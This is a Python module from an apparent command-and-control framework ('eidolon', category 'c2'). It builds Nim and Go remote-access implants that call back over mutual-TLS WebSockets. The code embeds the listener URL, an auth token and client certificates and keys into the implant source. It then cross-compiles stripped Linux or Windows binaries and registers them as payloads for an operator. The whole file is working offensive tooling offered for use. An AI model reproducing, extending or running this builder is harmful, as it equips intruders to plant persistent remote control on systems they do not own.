## poly-builder — PAYLOAD BUILDER module — compiles the Nim and Go implants
## shipped next to this file in _src/ (implant.nim, implant.go).
##
## The implants speak "ws-json-mtls/1": one JSON object per WebSocket text
## frame, WebSocket over TLS with a client certificate (mTLS) baked into the
## binary at build time plus a shared hello token. They phone home to
## ws-mtls-listener (publishes a _Profile with cert paths).
##
## Pipeline: profile -> validate cert material -> render _src/implant.<lang>
## with {{URL}} {{TOKEN}} {{CA_PEM}} {{CLIENT_CERT_PEM}} {{CLIENT_KEY_PEM}}
## -> compile (go build / nim c) -> 0o700 artifact in the operator's working
## directory (never temp) -> register_payload(keep=True).

import os
import subprocess
import shutil
import tempfile

from eidolon.utils import ok, err, info, warn, spectral

NAME        = "poly-builder"
VERSION     = "1.0.0"
DESCRIPTION = ("Builds the bundled Nim/Go mTLS-WebSocket implants "
               "for ws-mtls-listener")
CATEGORY    = "c2"
MODULE_TYPE = "payload"
AUTHOR      = "ghost-union"

PAYLOAD_KIND = "file"
REQUIREMENTS = []           # toolchains are binaries (go / nim), not pip.
ASSETS       = ("_src",)    # bundled implant sources install_local ships with this module

OPTIONS = {
    "lang": {
        "value":    "",
        "required": True,
        "desc":     "implant language: nim | go",
    },
    "name": {
        "value":    "",
        "required": True,
        "desc":     "store name for the built artifact",
    },
    "output": {
        "value":    "",
        "required": False,
        "desc":     "artifact path (empty = operator working directory)",
    },
    "target_os": {
        "value":    "",
        "required": False,
        "desc":     "linux | windows (empty = this host's OS)",
    },
    "target_arch": {
        "value":    "x86_64",
        "required": False,
        "desc":     "x86_64 | arm64",
    },
}

_PROTOCOL_TAG = "ws-json-mtls"

_GO_MAP = {"linux": "linux", "windows": "windows"}
_GARCH_MAP = {"x86_64": "amd64", "arm64": "arm64"}


def _host_os():
    return "windows" if os.name == "nt" else "linux"


def _profile():
    return getattr(EIDOLON_SHELL, "wraith_listener", None)


def _artifact_target(opts):
    """Resolve the output path the operator would expect: explicit output
    wins; the default is a file in the CURRENT working directory. Never
    temp, never a framework-internal copy."""
    name = str(opts.get("name", "")).strip()
    target_os = str(opts.get("target_os", "")).strip().lower()
    if not target_os:
        target_os = _host_os()

    stem = name
    ext = ".exe" if target_os == "windows" else ""

    out = str(opts.get("output", "")).strip()
    if out:
        out = os.path.abspath(os.path.expanduser(out))
        if os.path.isdir(out):
            out = os.path.join(out, stem + ext)
        return out
    return os.path.join(os.getcwd(), stem + ext)


def _render(lang, lsn):
    """Read the raw implant source and bake the profile in. PEM materials
    come from the listener's published profile (paths on disk)."""
    base = os.path.dirname(os.path.abspath(__eidolon_path__))
    tpl = os.path.join(base, "_src", "implant." + lang)
    if not os.path.isfile(tpl):
        raise FileNotFoundError(f"bundled source missing: {tpl}")

    with open(tpl, "r", encoding="utf-8") as f:
        src = f.read()

    ca_pem = open(lsn.ca_crt, "r", encoding="utf-8").read()
    crt_pem = open(lsn.client_crt, "r", encoding="utf-8").read()
    key_pem = open(lsn.client_key, "r", encoding="utf-8").read()

    for token, value in (("{{CA_PEM}}", ca_pem),
                         ("{{CLIENT_CERT_PEM}}", crt_pem),
                         ("{{CLIENT_KEY_PEM}}", key_pem),
                         ("{{URL}}", str(lsn.url)),
                         ("{{TOKEN}}", str(lsn.token))):
        src = src.replace(token, value)

    if "{{" in src and "}}" in src:
        raise ValueError("unrendered placeholder in source — aborting")

    return src


def _probe(tool, timeout, cmdline, env):
    if shutil.which(tool) is None:
        raise FileNotFoundError(
            f"'{tool}' not on PATH — install it and retry "
            f"(this is module-owned tooling, not a pip dep)")
    res = subprocess.run(cmdline, env=env, timeout=timeout,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    return res


def _compile(lang, src, artifact, target_os, target_arch, log):
    work = tempfile.mkdtemp(prefix="poly-build-")
    try:
        src_path = os.path.join(work, "implant." + lang)
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(src)

        env = dict(os.environ)
        env.pop("GOOS", None)
        env.pop("GOARCH", None)
        env.pop("CGO_ENABLED", None)
        env["CGO_ENABLED"] = "0"

        if lang == "go":
            if target_os not in _GO_MAP or target_arch not in _GARCH_MAP:
                raise ValueError("unsupported go target: "
                                 f"{target_os}/{target_arch}")
            env["GOOS"] = _GO_MAP[target_os]
            env["GOARCH"] = _GARCH_MAP[target_arch]
            env["GOCACHE"] = os.path.join(work, "gocache")
            cmdline = ["go", "build", "-trimpath", "-buildvcs=false",
                       "-ldflags=-s -w", "-o", artifact, src_path]
            res = _probe("go", 180, cmdline, env)
        else:
            if target_arch not in _GARCH_MAP:
                raise ValueError(f"unsupported nim target arch: {target_arch}")
            if target_os != _host_os():
                raise ValueError(
                    "nim cross-compiling (linux -> windows) needs a mingw "
                    "toolchain wired up — build natively on the target OS, "
                    "or ship the .nim source and compile it there "
                    "(nim c -d:release -d:ssl --opt:size)")
            cmdline = ["nim", "c", "-d:release", "-d:ssl", "--opt:size",
                       f"--nimcache:{os.path.join(work, 'cache')}",
                       f"-o:{artifact}", src_path]
            res = _probe("nim", 300, cmdline, env)

        if res.returncode != 0:
            tail = "\n".join(res.stdout.decode(errors="replace").splitlines()[-40:])
            raise RuntimeError(f"{lang} compiler exit {res.returncode}\n{tail}")
        if log:
            info(subprocess.list2cmdline(cmdline))
    finally:
        try:
            shutil.rmtree(work, ignore_errors=True)
        except OSError:
            pass
    return artifact


def run(opts):
    """Renders and compiles the bundled nim/go implant against the live
    listener profile, then registers the artifact (keep=True -> it STAYS
    exactly where it was written, no temp moves)."""
    lang = str(opts.get("lang", "")).strip().lower()
    name = str(opts.get("name", "")).strip()
    target_arch = str(opts.get("target_arch", "x86_64")).strip().lower()
    target_os = str(opts.get("target_os", "")).strip().lower()
    verbose = False

    if not name:
        return err("set a store name first: set name my-implant")
    if lang not in ("nim", "go"):
        return err(f"unsupported build language: {lang!r} (use nim or go)")
    if not target_arch:
        target_arch = "x86_64"
    if not target_os:
        target_os = _host_os()

    lsn = _profile()
    if not lsn:
        return err("no listener up — ws-mtls-listener module first: "
                   "use ws-mtls-listener · set · run")
    url = str(getattr(lsn, "url", ""))
    if url.startswith("ws://"):
        warn("profile is PLAIN ws:// — this implant bakes mTLS PEMs in; "
             "run the listener on wss:// (tls=on) for the identity to mean "
             "anything")
    for attr in ("ca_crt", "client_crt", "client_key"):
        if not getattr(lsn, attr, None) or not os.path.isfile(str(getattr(lsn, attr))):
            return err(f"listener profile lacks {attr!r} — regenerate its "
                       "cert material before building payloads")

    info(f"embedding: {url} · token {str(lsn.token)[:8]}… · {getattr(lsn, 'tags', '')}")

    try:
        src = _render(lang, lsn)
    except (OSError, ValueError) as e:
        return err(f"render failed: {e}")

    artifact = _artifact_target(opts)
    parent = os.path.dirname(os.path.abspath(artifact))
    if not os.path.isdir(parent):
        try:
            os.makedirs(parent, exist_ok=True)
        except OSError as e:
            return err(f"cannot create output directory {parent!r}: {e}")

    info(f"compiling implant.{lang} -> {artifact}")
    try:
        _compile(lang, src, artifact, target_os, target_arch, log=verbose)
        os.chmod(artifact, 0o700)
    except (OSError, ValueError, RuntimeError, subprocess.TimeoutExpired) as e:
        return err(f"build failed: {e}")
    if not os.path.isfile(artifact):
        return err(f"compiler reported success but no artifact: {artifact}")

    from eidolon.wraith import store
    ptype = "file-win" if target_os == "windows" else "file-posix"
    backend = "go" if lang == "go" else "nim"
    try:
        manifest = store.register_payload(
            name, artifact,
            ptype=ptype,
            backend=backend,
            target_os=target_os,
            arch=target_arch,
            note=f"built by poly-builder ({lang} -> "
                 f"{target_os}/{target_arch})",
            protocol_tag=_PROTOCOL_TAG,
            config={
                "lang": lang,
                "url": url,
                "target_os": target_os,
                "target_arch": target_arch,
            },
            keep=True)
    except (OSError, ValueError) as e:
        return err(f"store refused the artifact: {e}")

    ok(f"built + registered: {store.summary(manifest)} "
       f"-> {store.artifact_path(manifest)}")
